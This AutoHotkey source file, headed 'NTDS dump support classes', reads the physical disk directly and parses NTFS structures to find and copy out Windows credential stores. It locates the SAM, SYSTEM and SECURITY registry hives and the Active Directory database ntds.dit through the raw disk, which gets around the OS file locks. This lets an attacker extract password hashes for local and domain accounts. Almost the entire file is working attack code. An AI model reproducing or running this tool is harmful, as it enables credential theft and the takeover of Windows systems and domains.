; ============================================================================
; NTDS DUMP SUPPORT CLASSES
; Standalone classes for NTFS parsing and raw disk reading
; ============================================================================

class DiskReader {
    static GENERIC_READ := 0x80000000
    static OPEN_EXISTING := 3
    static FILE_SHARE_READ := 0x00000001
    static FILE_SHARE_WRITE := 0x00000002
    static FILE_SHARE_DELETE := 0x00000004
    static FILE_BEGIN := 0

    static ReadDisk(offset, size) {
        ; Align reads to sector boundaries
        sectorSize := 512
        alignedOffset := (offset // sectorSize) * sectorSize
        offsetDiff := offset - alignedOffset
        alignedSize := ((size + offsetDiff + sectorSize - 1) // sectorSize) * sectorSize

        hFile := DllCall("CreateFile",
            "Str", "\\.\PHYSICALDRIVE0",
            "UInt", this.GENERIC_READ,
            "UInt", this.FILE_SHARE_READ | this.FILE_SHARE_WRITE | this.FILE_SHARE_DELETE,
            "Ptr", 0,
            "UInt", this.OPEN_EXISTING,
            "UInt", 0,
            "Ptr", 0,
            "Ptr")

        if (hFile = -1) {
            throw Error("Failed to open physical drive. Error: " . A_LastError)
        }

        try {
            newPosBuffer := Buffer(8)
            if !DllCall("SetFilePointerEx",
                "Ptr", hFile,
                "Int64", alignedOffset,
                "Ptr", newPosBuffer,
                "UInt", this.FILE_BEGIN) {
                throw Error("Failed to set file pointer. Error: " . A_LastError)
            }

            alignedBuffer := Buffer(alignedSize)
            bytesRead := 0
            if !DllCall("ReadFile",
                "Ptr", hFile,
                "Ptr", alignedBuffer,
                "UInt", alignedSize,
                "UInt*", &bytesRead,
                "Ptr", 0) {
                throw Error("Failed to read disk. Error: " . A_LastError)
            }

            ; Extract the requested portion
            resultBuffer := Buffer(size)
            DllCall("RtlMoveMemory", "Ptr", resultBuffer, "Ptr", alignedBuffer.Ptr + offsetDiff, "UInt", size)

            return resultBuffer
        }
        finally {
            DllCall("CloseHandle", "Ptr", hFile)
        }
    }
}

; MFT Attribute types
class MFTAttributes {
    static STANDARD_INFORMATION := 0x10
    static ATTRIBUTE_LIST := 0x20
    static FILE_NAME := 0x30
    static DATA := 0x80
    static INDEX_ROOT := 0x90
}

class DataRun {
    static Decode(dataRunBytes) {
        result := []
        pos := 0
        previousLCN := 0
        totalClusters := 0

        NTDSLogger.Debug("Decoding data runs, buffer size: " . dataRunBytes.Size)

        while (pos < dataRunBytes.Size) {
            header := NumGet(dataRunBytes, pos, "UChar")
            if (header = 0) {
                break
            }
            pos++

            lengthBytes := header & 0x0F
            offsetBytes := (header >> 4) & 0x0F

            if (lengthBytes = 0) {
                break
            }

            ; Read run length
            runLength := 0
            loop lengthBytes {
                if (pos >= dataRunBytes.Size) {
                    break 2
                }
                runLength |= NumGet(dataRunBytes, pos, "UChar") << ((A_Index - 1) * 8)
                pos++
            }

            ; Read run offset (signed)
            runOffset := 0
            if (offsetBytes > 0) {
                loop offsetBytes {
                    if (pos >= dataRunBytes.Size) {
                        break 2
                    }
                    runOffset |= NumGet(dataRunBytes, pos, "UChar") << ((A_Index - 1) * 8)
                    pos++
                }

                ; Sign extend if necessary
                if (offsetBytes < 8 && (runOffset & (1 << (offsetBytes * 8 - 1)))) {
                    runOffset |= (-1 << (offsetBytes * 8))
                }
            }

            currentLCN := previousLCN + runOffset
            previousLCN := currentLCN

            totalClusters += runLength
            result.Push({lcn: currentLCN, length: runLength})
        }

        return {runs: result, totalClusters: totalClusters}
    }
}

class NTDSLogger {
    static logFile := A_ScriptDir . "\ntfs_reader_" . A_Now . ".log"
    static file := ""
    static verbose := false  ; Set to true for detailed logging

    static Init() {
        this.file := FileOpen(this.logFile, "w")
        this.Log("NTFS Raw Disk Reader Started - " . A_Now)
        this.Log("=" . StrReplace(Format("{:80}", ""), " ", "="))
    }

    static Log(msg) {
        if (this.file) {
            this.file.WriteLine(A_Now . " - " . msg)
            this.file.Read(0)  ; Flush
        }
        OutputDebug(msg . "`n")
    }

    static Debug(msg) {
        if (this.verbose) {
            this.Log("[DEBUG] " . msg)
        }
    }

    static LogHex(data, length := 64, offset := 0) {
        hex := ""
        ascii := ""

        loop Min(length, data.Size) {
            b := NumGet(data, offset + A_Index - 1, "UChar")
            hex .= Format("{:02X} ", b)
            ascii .= (b >= 32 && b <= 126) ? Chr(b) : "."

            if (Mod(A_Index, 16) = 0) {
                this.Log(Format("{:04X}: ", offset + A_Index - 16) . hex . " | " . ascii)
                hex := ""
                ascii := ""
            }
        }

        if (hex != "") {
            padded_hex := hex . StrReplace(Format("{:-" . ((16 - (Mod(length, 16))) * 3) . "}", ""), " ", " ")
            this.Log(Format("{:04X}: ", offset + ((length - 1) // 16) * 16) . padded_hex . " | " . ascii)
        }
    }

    static Close() {
        if (this.file) {
            this.file.Close()
        }
    }
}

class NTFSParser {
    static SECTOR_SIZE := 512
    static CLUSTER_SIZE := 4096
    static NTFS_LOCATION := 0
    static MFT_LOCATION := 0
    static targetFiles := Map()
    static foundFiles := Map()
    static MFT_RECORD_SIZE := 1024

    ; Target files with EXACT expected paths (case-insensitive but path-sensitive)
    static TARGET_FILES := Map(
        "SYSTEM", {name: "SYSTEM", paths: ["Windows\System32\config\SYSTEM"]},
        "SAM", {name: "SAM", paths: ["Windows\System32\config\SAM"]},
        "SECURITY", {name: "SECURITY", paths: ["Windows\System32\config\SECURITY"]},
        "ntds.dit", {name: "ntds.dit", paths: ["Windows\NTDS\ntds.dit"]}
    )

    static Init() {
        this.targetFiles := this.TARGET_FILES
        this.foundFiles.Clear()
    }

    static FindNTFSPartition() {
        firstSection := DiskReader.ReadDisk(0, 1024)

        ; Check for MBR
        maxPartitionSize := 0
        ntfsLocation := 0

        NTDSLogger.Log("Analyzing partition table...")

        loop 4 {
            offset := 0x1BE + ((A_Index - 1) * 0x10)

            partitionType := NumGet(firstSection, offset + 4, "UChar")
            startLBA := NumGet(firstSection, offset + 8, "UInt")
            sizeSectors := NumGet(firstSection, offset + 12, "UInt")

            if (sizeSectors > 0) {
                NTDSLogger.Log("Partition " . A_Index . ": Type=0x" . Format("{:02X}", partitionType)
                    . ", Start LBA=" . startLBA . ", Size=" . sizeSectors . " sectors")

                ; Look for NTFS partitions (type 0x07)
                if (partitionType = 0x07 && sizeSectors > maxPartitionSize) {
                    maxPartitionSize := sizeSectors
                    ntfsLocation := startLBA * this.SECTOR_SIZE
                }
            }
        }

        this.NTFS_LOCATION := ntfsLocation
        NTDSLogger.Log("Selected NTFS partition at offset: 0x" . Format("{:X}", ntfsLocation))
        return ntfsLocation
    }

    static AnalyzeNTFS(ntfsLocation) {
        ntfsHeader := DiskReader.ReadDisk(ntfsLocation, 1024)

        signature := StrGet(ntfsHeader.Ptr + 3, 4, "UTF-8")
        if (signature != "NTFS") {
            throw Error("Not a valid NTFS partition at 0x" . Format("{:X}", ntfsLocation))
        }

        bytesPerSector := NumGet(ntfsHeader, 0x0B, "UShort")
        sectorsPerCluster := NumGet(ntfsHeader, 0x0D, "UChar")
        mftClusterNumber := NumGet(ntfsHeader, 0x30, "Int64")

        this.CLUSTER_SIZE := bytesPerSector * sectorsPerCluster
        this.MFT_LOCATION := (mftClusterNumber * this.CLUSTER_SIZE) + ntfsLocation

        NTDSLogger.Log("NTFS Info: BytesPerSector=" . bytesPerSector
            . ", SectorsPerCluster=" . sectorsPerCluster
            . ", ClusterSize=" . this.CLUSTER_SIZE
            . ", MFT Location=0x" . Format("{:X}", this.MFT_LOCATION))

        return {
            bytesPerSector: bytesPerSector,
            sectorsPerCluster: sectorsPerCluster,
            clusterSize: this.CLUSTER_SIZE,
            mftLocation: this.MFT_LOCATION
        }
    }

    static ParseMFTRecord(mftRecord, recordNumber := -1) {
        ; Check FILE signature
        if (NumGet(mftRecord, 0, "UInt") != 0x454C4946) {  ; "FILE"
            return false
        }

        ; Get update sequence array info
        updateSeqOffset := NumGet(mftRecord, 0x04, "UShort")
        updateSeqSize := NumGet(mftRecord, 0x06, "UShort")

        ; Apply fixup if needed
        if (updateSeqOffset > 0 && updateSeqSize > 0) {
            this.ApplyFixup(mftRecord, updateSeqOffset, updateSeqSize)
        }

        firstAttrOffset := NumGet(mftRecord, 0x14, "UShort")

        recordInfo := {
            recordNumber: recordNumber,
            attributes: Map(),
            fileName: "",
            fullPath: "",
            parentRecord: 0,
            dataRuns: [],
            fileSize: 0,
            isResident: false,
            residentData: "",
            isCompressed: false,
            isEncrypted: false,
            isSparse: false
        }

        currentOffset := firstAttrOffset

        loop {
            if (currentOffset >= 1024 || currentOffset < firstAttrOffset) {
                break
            }

            attrType := NumGet(mftRecord, currentOffset, "UInt")

            if (attrType = 0xFFFFFFFF || attrType = 0) {
                break
            }

            attrLength := NumGet(mftRecord, currentOffset + 4, "UInt")

            if (attrLength = 0 || attrLength > 1024 || currentOffset + attrLength > 1024) {
                break
            }

            ; Parse specific attributes
            if (attrType = MFTAttributes.FILE_NAME) {
                this.ParseFileName(mftRecord, currentOffset, recordInfo)
            } else if (attrType = MFTAttributes.DATA) {
                this.ParseDataAttribute(mftRecord, currentOffset, recordInfo)
            }

            currentOffset += attrLength
        }

        return recordInfo
    }

    static ApplyFixup(mftRecord, updateSeqOffset, updateSeqSize) {
        ; Apply NTFS fixup to correct sector boundaries
        updateSeqNumber := NumGet(mftRecord, updateSeqOffset, "UShort")

        loop (updateSeqSize - 1) {
            fixupOffset := 510 + ((A_Index - 1) * 512)
            if (fixupOffset < mftRecord.Size) {
                fixupValue := NumGet(mftRecord, updateSeqOffset + (A_Index * 2), "UShort")
                NumPut("UShort", fixupValue, mftRecord, fixupOffset)
            }
        }
    }

    static ParseFileName(mftRecord, attrOffset, recordInfo) {
        nonResident := NumGet(mftRecord, attrOffset + 8, "UChar")
        if (nonResident) {
            return
        }

        contentOffset := NumGet(mftRecord, attrOffset + 20, "UShort")
        dataOffset := attrOffset + contentOffset

        ; Parent directory reference
        parentRef := NumGet(mftRecord, dataOffset, "UInt64") & 0xFFFFFFFFFFFF
        recordInfo.parentRecord := parentRef

        ; File name info
        fileNameLength := NumGet(mftRecord, dataOffset + 0x40, "UChar")
        fileNameType := NumGet(mftRecord, dataOffset + 0x41, "UChar")

        ; Check file attribute flags
        fileAttrFlags := NumGet(mftRecord, dataOffset + 0x48, "UInt")

        recordInfo.isCompressed := (fileAttrFlags & 0x0800) != 0
        recordInfo.isEncrypted := (fileAttrFlags & 0x4000) != 0
        recordInfo.isSparse := (fileAttrFlags & 0x8000) != 0

        if (fileNameLength > 0 && fileNameLength < 255) {
            ; Read filename (UTF-16)
            fileName := ""
            loop fileNameLength {
                char := NumGet(mftRecord, dataOffset + 0x42 + ((A_Index - 1) * 2), "UShort")
                if (char > 0) {
                    fileName .= Chr(char)
                }
            }
            recordInfo.fileName := fileName
        }
    }

    static ParseDataAttribute(mftRecord, attrOffset, recordInfo) {
        nonResident := NumGet(mftRecord, attrOffset + 8, "UChar")

        if (!nonResident) {
            ; Resident data - file content is stored in MFT
            contentSize := NumGet(mftRecord, attrOffset + 16, "UInt")
            contentOffset := NumGet(mftRecord, attrOffset + 20, "UShort")
            recordInfo.fileSize := contentSize
            recordInfo.isResident := true

            ; For small files, store the actual data
            if (contentSize > 0 && contentSize < 1024) {
                dataBuffer := Buffer(contentSize)
                sourceOffset := attrOffset + contentOffset
                loop contentSize {
                    NumPut("UChar", NumGet(mftRecord, sourceOffset + A_Index - 1, "UChar"),
                           dataBuffer, A_Index - 1)
                }
                recordInfo.residentData := dataBuffer
            }
        } else {
            ; Non-resident data
            allocatedSize := NumGet(mftRecord, attrOffset + 40, "UInt64")
            realSize := NumGet(mftRecord, attrOffset + 48, "UInt64")
            recordInfo.fileSize := realSize
            recordInfo.isResident := false

            ; Get data runs
            dataRunOffset := NumGet(mftRecord, attrOffset + 32, "UShort")
            dataRunStart := attrOffset + dataRunOffset

            ; Calculate size safely
            attrTotalLength := NumGet(mftRecord, attrOffset + 4, "UInt")
            dataRunSize := attrTotalLength - dataRunOffset

            if (dataRunSize > 0 && dataRunSize < 512 && dataRunStart + dataRunSize <= 1024) {
                dataRunBuffer := Buffer(dataRunSize)
                loop dataRunSize {
                    NumPut("UChar", NumGet(mftRecord, dataRunStart + A_Index - 1, "UChar"),
                           dataRunBuffer, A_Index - 1)
                }

                decodedRuns := DataRun.Decode(dataRunBuffer)
                recordInfo.dataRuns := decodedRuns.runs
            }
        }
    }

    static GetFullPath(recordNumber) {
        path := []
        currentRecord := recordNumber
        maxDepth := 20

        while (currentRecord > 5 && maxDepth > 0) {
            try {
                mftRecord := DiskReader.ReadDisk(this.MFT_LOCATION + (currentRecord * this.MFT_RECORD_SIZE),
                                                this.MFT_RECORD_SIZE)
                recordInfo := this.ParseMFTRecord(mftRecord, currentRecord)

                if (!recordInfo || !recordInfo.fileName) {
                    break
                }

                path.InsertAt(1, recordInfo.fileName)
                currentRecord := recordInfo.parentRecord
                maxDepth--
            } catch {
                break
            }
        }

        return path
    }

    static CheckIfTargetFile(recordInfo) {
        ; Check if this is one of our target files
        for targetKey, targetInfo in this.targetFiles {
            ; Check if filename matches (case-insensitive)
            if (StrLower(recordInfo.fileName) = StrLower(targetInfo.name)) {
                ; Get full path
                fullPath := this.GetFullPath(recordInfo.parentRecord)
                fullPathStr := ""
                for dir in fullPath {
                    fullPathStr .= dir . "\"
                }
                fullPathStr .= recordInfo.fileName

                ; Check if EXACT path matches (case-insensitive)
                for expectedPath in targetInfo.paths {
                    if (StrLower(fullPathStr) = StrLower(expectedPath)) {
                        recordInfo.fullPath := fullPathStr
                        return targetKey
                    }
                }
            }
        }

        return ""
    }

    static ScanMFTForFiles(maxRecords := 200000) {
        NTDSLogger.Log("Starting MFT scan for system files...")
        NTDSLogger.Log("Looking for EXACT paths:")
        for key, info in this.targetFiles {
            NTDSLogger.Log("  - " . info.paths[1])
        }

        foundCount := 0
        targetCount := this.targetFiles.Count

        ; Start from record 0 and scan systematically
        loop maxRecords {
            recordNumber := A_Index - 1

            if (Mod(recordNumber, 10000) = 0 && recordNumber > 0) {
                NTDSLogger.Log("Scanned " . recordNumber . " MFT records... Found " . foundCount . " of " . targetCount . " files")
            }

            try {
                mftRecord := DiskReader.ReadDisk(this.MFT_LOCATION + (recordNumber * this.MFT_RECORD_SIZE),
                                               this.MFT_RECORD_SIZE)
                recordInfo := this.ParseMFTRecord(mftRecord, recordNumber)

                if (recordInfo && recordInfo.fileName != "") {
                    ; Check if this is a target file in the right location
                    targetKey := this.CheckIfTargetFile(recordInfo)

                    if (targetKey != "" && !this.foundFiles.Has(targetKey)) {
                        NTDSLogger.Log("Found target file: " . recordInfo.fileName
                            . " at record " . recordNumber
                            . ", Size: " . recordInfo.fileSize . " bytes"
                            . ", Path: " . recordInfo.fullPath
                            . ", Resident: " . (recordInfo.isResident ? "Yes" : "No"))

                        this.foundFiles[targetKey] := recordInfo
                        foundCount++

                        if (foundCount = targetCount) {
                            NTDSLogger.Log("All target files found!")
                            return true
                        }
                    }
                }
            } catch as e {
                ; Skip bad records silently
            }
        }

        NTDSLogger.Log("MFT scan completed. Found " . foundCount . " of " . targetCount . " files")

        ; Report which files were not found
        for key, info in this.targetFiles {
            if (!this.foundFiles.Has(key)) {
                NTDSLogger.Log("NOT FOUND: " . info.paths[1])
            }
        }

        return false
    }

    static ExtractFile(recordInfo, outputPath) {
        NTDSLogger.Log("Extracting " . recordInfo.fileName . " to " . outputPath)
        NTDSLogger.Log("File size: " . recordInfo.fileSize . " bytes")

        outFile := FileOpen(outputPath, "w")

        try {
            if (!recordInfo.isResident) {
                totalBytesWritten := 0
                remainingBytes := recordInfo.fileSize

                for idx, dataRun in recordInfo.dataRuns {
                    if (dataRun.lcn < 0) {
                        ; Sparse run handling...
                        continue
                    }

                    clusterOffset := dataRun.lcn * this.CLUSTER_SIZE + this.NTFS_LOCATION
                    bytesToRead := Min(dataRun.length * this.CLUSTER_SIZE, remainingBytes)

                    ; Read in chunks
                    chunkSize := 1024 * 1024  ; 1MB chunks
                    bytesRead := 0

                    while (bytesRead < bytesToRead && totalBytesWritten < recordInfo.fileSize) {
                        currentChunkSize := Min(chunkSize, bytesToRead - bytesRead)
                        ; Make sure we don't exceed file size
                        currentChunkSize := Min(currentChunkSize, recordInfo.fileSize - totalBytesWritten)

                        data := DiskReader.ReadDisk(clusterOffset + bytesRead, currentChunkSize)
                        outFile.RawWrite(data, currentChunkSize)

                        bytesRead += currentChunkSize
                        totalBytesWritten += currentChunkSize

                        ; Progress logging
                        if (Mod(totalBytesWritten, 10 * 1024 * 1024) = 0) {
                            NTDSLogger.Log("Progress: " . Round(totalBytesWritten / 1024 / 1024) . " MB written")
                        }

                        ; Check if we've written everything
                        if (totalBytesWritten >= recordInfo.fileSize) {
                            NTDSLogger.Log("Reached target file size: " . totalBytesWritten . " bytes")
                            break 2  ; Break out of both loops
                        }
                    }

                    remainingBytes -= bytesToRead
                    if (remainingBytes <= 0) {
                        break
                    }
                }

                NTDSLogger.Log("File extracted. Total bytes written: " . totalBytesWritten
                    . " (expected: " . recordInfo.fileSize . ")")

                ; Verify extraction
                if (totalBytesWritten < recordInfo.fileSize) {
                    NTDSLogger.Log("WARNING: Extraction incomplete! Missing "
                        . (recordInfo.fileSize - totalBytesWritten) . " bytes")
                }
            }

            return true

        } catch as e {
            NTDSLogger.Log("Error extracting file: " . e.Message)
            return false
        } finally {
            outFile.Close()
        }
    }
}
